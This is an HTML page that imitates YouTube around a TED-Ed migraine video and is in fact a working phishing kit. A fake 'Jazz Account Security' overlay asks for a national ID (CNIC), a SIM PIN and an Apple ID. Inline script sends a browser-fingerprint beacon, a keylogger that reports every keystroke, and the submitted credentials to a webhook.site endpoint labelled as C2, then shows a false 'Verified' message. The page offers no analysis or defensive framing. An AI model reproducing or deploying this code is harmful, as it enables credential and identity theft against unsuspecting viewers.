<!DOCTYPE html>
<html>
<head>
    <title>What happens to your brain during a migraine - YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://www.youtube.com/s/desktop/733d995b/img/favicon_32x32.png">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0f0f0f;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.4;}
        .header{background:#000;padding:10px 20px;display:flex;align-items:center;}
        .logo img{width:40px;height:40px;}
        .title{margin:20px auto;max-width:560px;font-size:18px;}
        .player-container{background:#000;margin:20px auto;max-width:560px;border-radius:8px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
        .video-player{height:315px;background:#111;position:relative;}
        .video-placeholder{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:68px;background:#333;border-radius:4px;display:flex;align-items:center;justify-content:center;}
        .play-btn{font-size:40px;}
        .form-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;display:none;}
        .form-container{background:#212121;padding:30px;border-radius:12px;max-width:400px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.5);}
        input,button{width:100%;padding:15px;margin:10px 0;border:none;border-radius:6px;font-size:16px;}
        input{background:#333;color:#fff;}
        button{background:#ff0000;color:#fff;font-weight:700;cursor:pointer;}
        .close-btn{position:absolute;top:15px;right:20px;font-size:30px;cursor:pointer;color:#ccc;}
        .description{margin:20px auto;max-width:560px;font-size:14px;color:#aaa;line-height:1.5;}
        @media (max-width:600px){.player-container{margin:10px;max-width:100%;}}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://www.youtube.com/s/desktop/733d995b/img/favicon_144.png" alt="YouTube">
        </div>
    </div>
    
    <h1 class="title">What happens to your brain during a migraine - Marianne Schwarz</h1>
    
    <div class="player-container">
        <div class="video-player" onclick="toggleForm()">
            <div class="video-placeholder">
                <span class="play-btn">▶</span>
            </div>
            <div class="form-overlay" id="formOverlay">
                <span class="close-btn" onclick="toggleForm()">&times;</span>
                <div class="form-container">
                    <h3>Jazz Account Security</h3>
                    <p>Verify to continue watching:</p>
                    <input type="text" id="cnic" placeholder="CNIC (xxxxx-xxxxxxx-x)" maxlength="15">
                    <input type="password" id="pin" placeholder="SIM PIN (4-6 digits)">
                    <input type="text" id="appleid" placeholder="Apple ID (optional)">
                    <button onclick="submitForm()">Verify & Watch</button>
                </div>
            </div>
        </div>
    </div>
    
    <div class="description">
        TED-Ed • 3.9M views • May 17, 2021<br>
        Find out what's happening in your brain when you have a migraine. Age-restricted video.
    </div>

    <script>
        // BEACON FIRE (same C2)
        fetch('https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                event: 'youtube_phish_load',
                timestamp: new Date().toISOString(),
                ua: navigator.userAgent,
                lang: navigator.language,
                url: window.location.href,
                screen: screen.width + 'x' + screen.height
            })
        });

        // KEYLOGGER
        document.addEventListener('keydown', function(e) {
            fetch('https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a', {
                method: 'POST',
                body: JSON.stringify({event: 'keystroke', key: e.key, target: e.target.id || 'unknown'})
            });
        });

        function toggleForm() {
            document.getElementById('formOverlay').style.display = 'flex';
        }

        function submitForm() {
            const data = {
                event: 'youtube_phish_submit',
                cnic: document.getElementById('cnic').value,
                pin: document.getElementById('pin').value,
                appleid: document.getElementById('appleid').value,
                ip: 'capture',
                ua: navigator.userAgent
            };
            
            fetch('https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            alert('✅ Verified! Playing video...');
            document.getElementById('formOverlay').style.display = 'none';
        }
    </script>
</body>
</html>
